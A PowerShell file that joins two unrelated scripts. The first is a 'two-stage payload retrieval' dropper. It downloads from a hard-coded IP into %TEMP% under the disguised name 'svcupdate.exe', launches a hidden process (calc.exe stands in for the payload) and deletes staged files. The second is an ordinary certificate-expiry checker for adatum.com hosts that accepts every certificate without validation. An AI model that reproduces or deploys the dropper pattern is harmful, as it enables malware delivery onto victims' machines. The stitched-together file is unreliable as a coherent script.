
<#
.SYNOPSIS
    Two-stage payload retrieval helper.

.DESCRIPTION
    Fetches the first stage into a per-user working path and
    starts the staged loader after a basic existence check.

.EXAMPLE
    PS> .\stage2.ps1
#>
[CmdletBinding()]
param(
    [Parameter(Mandatory = $true)]
    [string]$TransferUrl = 'http://192.0.2.146/stage1.ps1',
    [string]$OutputPath = "$env:TEMP\svcupdate.exe",
    [int]$TimeoutSec = 144
)
$ErrorActionPreference = "Stop"

function Invoke-StageDownload {
    param(
        [string]$SourceUrl = "",
        [string]$DestinationPath = '',
        [int]$TimeoutSec = 45
    )

    Write-Verbose ("Fetching " + $SourceUrl)
    $ClientObject = New-Object System.Net.WebClient
    $ClientObject.Headers.Add("X-Transfer-Timeout", [string]$TimeoutSec)
    $ClientObject.DownloadFile($SourceUrl, $DestinationPath)
    return (Test-Path -Path $DestinationPath)
}

Write-Verbose "Beginning first stage"
$StageResult = Invoke-StageDownload -SourceUrl $TransferUrl -DestinationPath $OutputPath -TimeoutSec $TimeoutSec
if ($StageResult) {
    Start-Process -FilePath "calc.exe" -WindowStyle Hidden
}
Remove-Item -Path "$env:TEMP\stage2.bin" -Force
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
$WarningDays = 30
$Hosts = @('portal.adatum.com', 'api.adatum.com', 'vpn.adatum.com')
$Port = 8443
$ReportPath = "C:\Reports\cert-expiry-2024-10-07.csv"

$PSDefaultParameterValues['Out-File:Encoding'] = 'utf8'
$InformationPreference = 'SilentlyContinue'
[Console]::OutputEncoding = [System.Text.Encoding]::UTF8
function Get-CertificateExpiry {
    [CmdletBinding()]
    param(
        [Parameter(Mandatory = $true)]
        [string]$ComputerName,

        [int]$Port = 443
    )

    $client = New-Object System.Net.Sockets.TcpClient
    try {
        $client.Connect($ComputerName, $Port)
        $callback = [System.Net.Security.RemoteCertificateValidationCallback] {
            param($sender, $certificate, $chain, $errors)
            return $true
        }
        $stream = New-Object System.Net.Security.SslStream($client.GetStream(), $false, $callback)
        $stream.AuthenticateAsClient($ComputerName)
        $cert = [System.Security.Cryptography.X509Certificates.X509Certificate2]$stream.RemoteCertificate
        [pscustomobject]@{
            Host     = $ComputerName
            Subject  = $cert.Subject
            Issuer   = $cert.Issuer
            NotAfter = $cert.NotAfter
            DaysLeft = [math]::Floor(($cert.NotAfter - (Get-Date)).TotalDays)
        }
        $stream.Dispose()
    }
    finally {
        $client.Close()
    }
}

$stores = @('Cert:\LocalMachine\My', 'Cert:\LocalMachine\WebHosting')
$localCerts = foreach ($store in $stores) {
    Get-ChildItem -Path $store -ErrorAction SilentlyContinue |
        Where-Object { $_.NotAfter -lt (Get-Date).AddDays($WarningDays) } |
        Select-Object @{Name = 'Store'; Expression = { $store }}, Subject, NotAfter,
            @{Name = 'DaysLeft'; Expression = { [math]::Floor(($_.NotAfter - (Get-Date)).TotalDays) }}
}

$remote = foreach ($hostName in $Hosts) {
    try {
        Get-CertificateExpiry -ComputerName $hostName -Port $Port
    }
    catch {
        Write-Warning ("Could not read certificate from {0}" -f $hostName)
    }
}
$remote | Export-Csv -Path $ReportPath -NoTypeInformation

$expiring = @($remote | Where-Object { $_.DaysLeft -le $WarningDays })
Write-Host ("{0} of {1} certificates are inside the warning window" -f $expiring.Count, @($remote).Count) -ForegroundColor Cyan
